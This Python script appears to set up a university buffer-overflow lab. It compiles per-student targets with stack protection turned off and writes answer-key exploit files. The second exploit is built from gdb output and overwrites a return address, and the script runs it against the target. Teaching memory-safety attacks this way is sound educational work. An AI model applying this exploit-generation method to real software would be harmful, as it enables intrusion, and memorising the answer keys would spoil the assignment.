import sys
import shutil,os
import random

if len(sys.argv) < 2:
	print("Error: usage mkalltargets.pl roster.csv\n")
	exit()

text_seg_base = "555555"

target_dir = "targets"
handout_dir = "student_targets"

#echo roster file
print(sys.argv[1])

#make the target and handout directors

#handout contains the student files
if not os.path.exists(handout_dir):
    os.makedirs(handout_dir)

#targets has one directory per student w/ targets and solutions automatically generated
if not os.path.exists(target_dir):
    os.makedirs(target_dir)

with open(sys.argv[1]) as f:
    for index, fullline in enumerate(f):
        line = fullline.split(',')
        lastname = line[0]
        firstname = line[1]
        name = firstname + " " + lastname
        netid = line[2].split('@')[0]
        email = line[3]
        print("Make targets for " + name + ", netid: " + netid + ", email " + email)
        sys.stdout.flush()

        # make netID subdir in targets
        tdir = target_dir + '/' + netid
        if not os.path.exists(tdir):
            os.makedirs(tdir)

        alignments = [16,32,48,64]
        t1bufsize =  random.choice(alignments)
        t1cmd = 'gcc -DBUFFER_SIZE=' + str(t1bufsize) + ' -static -fno-stack-protector -Og -o ' + tdir + '/target1-' + netid + ' target1.c'
       
        print(t1cmd)
        sys.stdout.flush()
        os.system(t1cmd)

        t2bufsize = random.choice(alignments)
        t2cmd = 'gcc -DBUFFER_SIZE=' + str(t2bufsize) + ' -static -fno-stack-protector -Og -o ' + tdir + '/target2-' + netid + ' target2.c'

        print(t2cmd)
        sys.stdout.flush()
        os.system(t2cmd)
        hdir = handout_dir + '/' + netid

        # copy target executables to student handout directory before we generate solutions
        shutil.copytree(tdir, hdir)
        htaccess_str = "AuthType shibboleth\nShibRequireSession On\nRequire user " + netid + "@duke.edu\n"
        outname = hdir + "/.htaccess"
        outfd = open(outname,"w+")
        outfd.write(htaccess_str)
        outfd.close()

        ## now generate solutions and write out other relevant information
        # write the buffer size information to target directory
        # gcc aligns the stack variabls on 16 byte boundaries so we need generate solution appropriately
        # This is rendered obsolete I think by using only multiples of 16 for the buffer size, but
        # I'm keeping it since things seem to work fine.
        alignment  = 16
        aligned_size = t1bufsize + ((alignment-(t1bufsize % alignment)) % alignment)
        print(aligned_size)
        sys.stdout.flush()

        f = open(tdir + '/info.txt',"w")
        f.write('target1 BUFFER_SIZE = ' + str(t1bufsize) + ', aligned size = ' + str(aligned_size) + '\n')
        f.write('target2 BUFFER_SIZE = ' + str(t2bufsize) + '\n')
        f.close()

       
        exploit_str = "0" * aligned_size + "Use the force Luke"
        f = open(tdir + '/exploit1.txt',"w")
        f.write(exploit_str)
        f.close()

        #use gdb to extract info from binary
        t2gdbcmd = 'gdb -nw -q ' + tdir + '/target2-' + netid + ' -x t2gdb.in > ' + tdir + '/gdb.out'
        print(t2gdbcmd)
        os.system(t2gdbcmd)
        #open the gdb information
        g = open(tdir + '/gdb.out', 'r')
        gdblines = g.readlines()
        stackstart = int(gdblines[4].split(' ')[2],16)
        stackend = int(gdblines[6].split(' ')[2],16)
        calladdr = gdblines[7].split(' ')[8]
        callstring = [(calladdr[i:i+2]) for i in range(0, len(calladdr), 2)]
        callstring[0] = '00'
        callstring = ['0a', '00'] + callstring
        callstring = callstring[::-1]

        stackoffset = stackstart - stackend
        stackalign = 8
        stackoffset = stackoffset + ((stackalign -(stackoffset % stackalign)) % stackalign)
        tstr = " "
        tostr = tstr.join(callstring)
        exploit_str = ('00 ' * stackoffset) + tostr
        f = open(tdir + '/exploit2.txt',"w")
        f.write(exploit_str)
        f.close()

        sys.stdout.flush()
        mkrawcmd = 'cat ' + tdir + '/exploit2.txt | ./hex2raw > ' + tdir + '/exploit2.raw'
        os.system(mkrawcmd)
        ckcmd =  tdir + '/target2-' + netid + ' < ' + tdir + '/exploit2.raw'
        os.system(ckcmd)

        





        


